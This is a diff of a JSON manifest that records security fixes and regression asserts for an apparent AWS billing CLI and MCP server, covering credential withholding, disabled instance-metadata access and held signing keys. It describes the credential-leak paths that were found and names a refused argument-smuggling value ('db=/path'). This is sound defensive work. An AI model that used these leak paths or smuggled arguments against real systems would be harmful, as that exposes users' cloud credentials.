+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsbillingblackbox/codex_r2_test.go",
+     "contains": "func TestR2HolderReadsSourcesAsTheSDKDoes(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "credkit-sqlite-every-handle",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "Every SQLite handle goes through credkit.SQLDriver: internal/credsql registers the one driver and every sql.Open in store.go and platform/migration.go names it, the read-only opener included. The MCP sql value cap moved from sqlite.Limit on a held connection to a DSN parameter that credsql applies as each connection opens; the read-only opener runs select 1 because the kit's connection does not forward Ping.",
+   "why": "A statement's text and bound values are a sink of their own, reads included, so a read-only handle on the bare driver would run a statement carrying a credential and withhold only the row afterwards. Replaces the connector's own withholding driver (store-never-keeps-secrets, retired with credkit-wiring). Same shape as abnormal's and connectwise-control's entries.",
+   "spec_encode_followup": "Press-side: generate store, migration and MCP sql opens against one kit-wrapped driver name, and express the MCP sql value cap as a connection-open setting rather than sqlite.Limit on a held connection.",
+   "asserts": [
+    {
+     "file": "cli/internal/credsql/credsql.go",
+     "contains": "sql.Register(Driver, credkit.SQLDriver(cappedSQLite()))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credsql/credsql.go",
+     "contains": "d.RegisterConnectionHook(applyLengthLimit)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "sql.Open(credsql.Driver, dsn)",
+     "min_count": 3,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "func OpenReadOnlyValueCapped(dbPath string, maxValueBytes int) (*Store, error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "dsn += \"&\" + credsql.LengthLimitParam + \"=\" + strconv.Itoa(maxValueBytes)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "if _, err := db.ExecContext(ctx, \"select 1\"); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "not_contains": "sql.Open(\"sqlite\""
+    },
+    {
+     "file": "cli/internal/platform/migration.go",
+     "contains": "sql.Open(credsql.Driver, ",
+     "min_count": 4,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/platform/migration.go",
+     "not_contains": "sql.Open(\"sqlite\""
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "db, err := store.OpenReadOnlyValueCapped(path, maxValueBytes)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "openMCPReadOnlyStore(path, mcpSQLMaxValueBytes)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "not_contains": "sqlite.Limit("
+    },
+    {
+     "file": "cli/internal/store/credkit_sql_test.go",
+     "contains": "func TestEveryStoreOpenChecksStatementsThroughTheKit(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/credkit_sql_test.go",
+     "contains": "func TestNoSQLiteHandleBypassesTheKit(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credsql/credsql_test.go",
+     "contains": "func TestLengthLimitAppliesToEveryConnection(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credsql/credsql_test.go",
+     "contains": "func TestBadLengthLimitRefusesTheOpen(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "credkit-mcphttp-outermost",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "credkit.MCPHTTP writes every response the MCP HTTP server serves, refusals included. requireBearerAuthWithLimits runs a preflight that writes nothing, then credkit.MCPHTTP around a gate that answers the Origin, bearer and body-limit verdicts.",
+   "why": "With the kit wrapping only the inner handler, a refusal answers outside it (kaseya-vsa: a token holding the word unauthorized made a GET /mcp without Authorization return a piece of the held token). Same shape as abnormal's and connectwise-control's entries.",
+   "spec_encode_followup": "Press-side: generate the MCP HTTP auth wrapper so its refusals are written by the inner, kit-wrapped handler and only a write-free preflight runs before credkit.MCPHTTP.",
+   "asserts": [
+    {
+     "file": "cli/cmd/aws-billing-mcp/main.go",
+     "contains": "requireBearerAuthWithOrigins(token, allowedOrigins, inner)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/aws-billing-mcp/main.go",
+     "contains": "kit := credkit.MCPHTTP(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/aws-billing-mcp/main.go",
+     "contains": "ref, refused := mcpHTTPPreflight(r, http.NewResponseController(w), expected, allowed, maxBytes, readTimeout)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/aws-billing-mcp/main.go",
+     "contains": "r.Header = http.Header{}",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/aws-billing-mcp/main.go",
+     "contains": "r.Body = http.NoBody",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/aws-billing-mcp/main.go",
+     "contains": "kit.ServeHTTP(w, r)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/aws-billing-mcp/main.go",
+     "not_contains": "rejectMCPHTTPRequest"
+    },
+    {
+     "file": "cli/cmd/aws-billing-mcp/main.go",
+     "not_contains": "credkit.MCPHTTP(inner)"
+    },
+    {
+     "file": "cli/cmd/aws-billing-mcp/main.go",
+     "not_contains": ".Hijack()"
+    }
+   ]
+  },
+  {
+   "id": "r1b-imds-off",
+   "class": "credential-sent-over-plain-http",
+   "status": "active",
+   "summary": "The AWS SDK's EC2 instance-metadata client is off in every config the connector loads (awsx loadConfig, the one LoadDefaultConfig call, used by every CLI command and so by every MCP tool, which runs the CLI): config.WithEC2IMDSClientEnableState(imds.ClientDisabled) is the config's first source, so it wins over AWS_EC2_METADATA_DISABLED and the shared config, and every IMDS client the SDK builds from the config (the instance-role credential provider, defaults_mode auto) sends nothing. The endpoint pin no longer allows 169.254.169.254 or fd00:ec2::254 over plain http. A credential chain that ends at instance metadata fails with a fixed error saying instance-metadata credentials are not used. The container credential addresses stay as they were: a request there carrying an authorization token is refused by the kit (the token is held; no held value goes over plain http).",
+   "why": "Codex r1 (finding at internal/credwire/declarations.go:72), RELEASE RULE item 2: on EC2 with no other credential source, the SDK's IMDS client minted an IMDSv2 token and sent it in x-aws-ec2-metadata-token to http://169.254.169.254, and read the instance role's credentials back, over plain http; the pin explicitly allowed the address. Confirmed on the production binary (HTTP proxy pointed at a fake instance-metadata service): the token was sent twice over plain http. Seen failing: seen/r1fix-credential-sent-over-plain-http-seen-failing.log; passing: seen/r1fix-credential-sent-over-plain-http-seen-passing.log; fix reverted: seen/r1fix-credential-sent-over-plain-http-seen-reverted.log.",
+   "asserts": [
+    {
+     "file": "cli/internal/awsx/client.go",
+     "contains": "config.WithEC2IMDSClientEnableState(imds.ClientDisabled)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsx/awsbilling_guard.go",
+     "not_contains": "\"169.254.169.254\": true"
+    },
+    {
+     "file": "cli/internal/awsx/awsbilling_guard.go",
+     "not_contains": "\"fd00:ec2::254\": true"
+    },
+    {
+     "file": "cli/internal/awsx/awsbilling_guard.go",
+     "contains": "\"169.254.170.2\": true, \"169.254.170.23\": true, \"fd00:ec2::23\": true,",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsx/awsbilling_guard.go",
+     "contains": "if errors.As(err, &oe) && oe.Service() == \"ec2imds\" {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsx/awsbilling_imds_test.go",
+     "contains": "func TestR1bIMDSAddressesRefusedByThePin(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsx/awsbilling_imds_test.go",
+     "contains": "func TestR1bIMDSClientOffInEveryLoadedConfig(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsbillingblackbox/r1b_imds_test.go",
+     "contains": "func TestR1bInstanceMetadataNeverContacted(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsbillingblackbox/r1b_imds_test.go",
+     "contains": "func TestR1bContainerTokenNeverSentOverPlainHTTP(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "SKILL.md",
+     "not_contains": "SSO, assume-role, or instance metadata"
+    },
+    {
+     "file": "guide.md",
+     "not_contains": "SSO, assume-role, or instance metadata"
+    },
+    {
+     "file": "README.md",
+     "not_contains": "SSO, assume-role, or instance metadata"
+    },
+    {
+     "file": "governance.md",
+     "not_contains": "assume-role, or instance"
+    }
+   ]
+  },
+  {
+   "id": "r1b-signers-held",
+   "class": "credential-used-but-not-held",
+   "status": "active",
+   "summary": "Every credential that signs an outgoing AWS request is held before the request is sent, whatever provider produced it and at any depth of an assume-role chain: the pinned transport's per-request hook (pinTransport, which the kit's guard runs on every request before it judges it and outside its locks) calls holdSigners, which holds the access key ID of every SigV4 Authorization header and presigned X-Amz-Credential, and every X-Amz-Security-Token header or query value (names in any case), with HoldMinted. Fail closed: an https request (every one the pin allows goes to an AWS endpoint) whose Authorization is not a SigV4 signature the parser reads is refused (non-retryable). holdingProvider still holds the final credentials' secret key.",
+   "why": "Codex r1 (finding at internal/awsx/awsbilling_guard.go:244): holdingProvider wraps only the outermost provider, and the SDK signs the STS AssumeRole call of an assume-role chain with the source profile's credentials, which it never returns; SigV4 Authorization is an exempt identifier source, so the source access key ID was never held. Confirmed on the built binary: a credential_process source_profile whose STS AssumeRole answered AccessDenied quoting the signing key printed the key on stderr and in the MCP result. Static keys in the shared credentials file did not reproduce (held from startup); the class fix covers every source. One fake-AWS run of the successful chain through the kit-wired binary shows the hold inside the round trip does not deadlock. Seen failing: seen/r1fix-credential-used-but-not-held-seen-failing.log; passing: seen/r1fix-credential-used-but-not-held-seen-passing.log; fix reverted: seen/r1fix-credential-used-but-not-held-seen-reverted.log.",
+   "asserts": [
+    {
+     "file": "cli/internal/awsx/awsbilling_guard.go",
+     "contains": "if err := holdSigners(req); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsx/awsbilling_guard.go",
+     "contains": "func holdSigners(req *http.Request) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsx/awsbilling_guard.go",
+     "contains": "HoldMinted(\"minted:aws-credentials\", held...)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsx/awsbilling_guard.go",
+     "contains": "return refusal{fmt.Errorf(\"%w (%s)\", ErrUnreadableSignature, displayHost(req.URL))}",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsx/awsbilling_guard.go",
+     "contains": "func sigV4AccessKey(v string) (string, bool) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsx/awsbilling_guard.go",
+     "contains": "func scopedAccessKey(cred string) (string, bool) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsx/awsbilling_signers_test.go",
+     "contains": "func TestR1bSignersHeldAtTheWire(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsbillingblackbox/r1b_signers_test.go",
+     "contains": "func TestR1bAssumeRoleSourceKeyNeverPrinted(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsbillingblackbox/fakeaws_test.go",
+     "contains": "assumeDeny bool",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "r1b-inventory-region-resolved",
+   "class": "cache-answer-not-the-request",
+   "status": "active",
+   "summary": "Every stored inventory read (ensureInventory: every waste subcommand, report and ask, CLI and MCP, which runs the CLI) answers for exactly the one region a live read scans, resolved the same way: awsReadOpts.inventoryRegion is the command's client region, or awsx.ResolveRegion, which loads the config through the same loadConfig as awsx.New (--region, AWS_REGION, AWS_DEFAULT_REGION, the profile's region, else us-east-1) and needs no request, so --data-source local resolves it too; a region that cannot be resolved is an error naming --region. store.InventoryIfScanned refuses a read naming no region and reads only that region's scan (and the account-wide S3 bucket rows). Cost Explorer, forecast and Organizations reads are global and not keyed by region.",
+   "why": "Codex r1 (finding at internal/cli/awsdata.go:190), class cache-answer-not-the-request: a stored read with no --region passed an empty region, which accepted every scanned region, while the live path scans the SDK-resolved region; so `sync --skip-cost --region us-east-1` followed by `AWS_REGION=us-west-2 waste rank --json` answered with us-east-1 waste. Confirmed on the built binary for AWS_REGION, AWS_DEFAULT_REGION and the profile's region, auto and --data-source local, and the MCP waste_rank tool. Seen failing: seen/r1fix-cache-answer-not-the-request-region-seen-failing.log; passing: seen/r1fix-cache-answer-not-the-request-region-seen-passing.log; fix reverted: seen/r1fix-cache-answer-not-the-request-region-seen-reverted.log.",
+   "asserts": [
+    {
+     "file": "cli/internal/awsx/client.go",
+     "contains": "func ResolveRegion(ctx context.Context, profile, region string) (string, error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsx/client.go",
+     "contains": "cfg, err := loadConfig(ctx, profile, region)",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/awsbilling_scope.go",
+     "contains": "func (o awsReadOpts) inventoryRegion(ctx context.Context) (string, error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/awsbilling_scope.go",
+     "contains": "region, err := awsx.ResolveRegion(ctx, o.profile, o.region)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/awsdata.go",
+     "contains": "region, serr = o.inventoryRegion(ctx)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/awsdata.go",
+     "contains": "inv, ok, incomplete, ierr := storedInventory(ctx, db, scope, region, typeFilter, account, wasteOnly)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/awsdata.go",
+     "not_contains": "storedInventory(ctx, db, scope, o.region,"
+    },
+    {
+     "file": "cli/internal/store/awsbilling_scope.go",
+     "contains": "return nil, false, \"\", fmt.Errorf(\"an inventory read names no AWS region: a scan covers one region\")",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/awsbilling_scope.go",
+     "not_contains": "if region != \"\" && r != region {"
+    },
+    {
+     "file": "cli/internal/awsbillingblackbox/r1b_region_test.go",
+     "contains": "func TestR1bStoredInventoryAnswersOnlyTheResolvedRegion(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsx/awsbilling_region_test.go",
+     "contains": "func TestR1bResolveRegionIsTheLiveClientsRegion(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/awsbilling_region_test.go",
+     "contains": "func TestR1bInventoryReadAnswersOnlyItsRegion(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "r1c-config-token-file-as-opened",
+   "class": "held-set-poisoned-by-a-path-the-sdk-never-opens",
+   "status": "active",
+   "summary": "holdAWSConfig (internal/credwire/declarations.go) names the credential kit one path per web_identity_token_file in ~/.aws/config: the value as the SDK reads it (config/internal/ini: cut at the first ' #', ' ;', tab-# or tab-;, then trimmed; sdkPropertyValue). It no longer names the untrimmed or otherwise cut variants, which the SDK never opens.",
+   "why": "Windows CI on PR #607: TestR1HolderReadsEverySDKCredentialSource saw recall print nothing. The untrimmed value is ' C:\\\\...' on Windows, no file name at all; the kit cannot stat it, cannot tell it from an unreadable credential file, marks the held set unknown and withholds every write of the run, its notices included (exit 74, no output). Reproduced on macOS with a regular file named ' ' in the working directory (TestR1cConfigTokenFileNamedAsTheSDKOpensIt, seen failing before the fix). The token file's contents stay held: the path named is the one the SDK opens.",
+   "asserts": [
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "tokenFiles = append(tokenFiles, sdkPropertyValue(raw))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "not_contains": "tokenFiles = append(tokenFiles, vals...)"
+    },
+    {
+     "file": "cli/internal/awsbillingblackbox/r1c_config_path_test.go",
+     "contains": "func TestR1cConfigTokenFileNamedAsTheSDKOpensIt(",
+     "code_only": true
+    }
+   ]
+  }
+ ],
+ "retired": [
+  {
+   "id": "mcp-filesystem-destination-gate",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0 builds a per-command blocked set (blockedDestinationFlags, blockedInputFlags, root control-plane flags), removes those flags from each tool's schema, refuses any undeclared argument name (so \"db=/path\" is refused) and skips '=' names in cliArgsFromMCP."
+  },
+  {
+   "id": "mcp-argv-value-joined",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #4647: every value-carrying branch of cliArgsFromMCP joins the value to its flag (--k=v, one element per list item), and the press generates TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag."
+  },
+  {
+   "id": "interim-http-security-note-2026-10-22",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: The note paused HTTP mode until a reprint because the build served HTTP with no token. Press 4.34.0 HTTP mode refuses to start without <PREFIX>_MCP_HTTP_TOKEN, answers 401 without the right bearer, binds 127.0.0.1 by default and refuses a non-loopback address without TLS; onboard.py now writes HTTP guidance that follows the binary (cc-skills #14) and never writes this note, so the entry would fail on every re-onboard."
+  },
+  {
+   "id": "mcp-file-flags-refused",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0's cobratree mirror derives one blocked set per command (destination, input, mcp:write-flags, mcp:read-flags and root control-plane flags), leaves those flags out of the tool schema and refuses them, and any undeclared argument, by name."
   }
  ]
 }
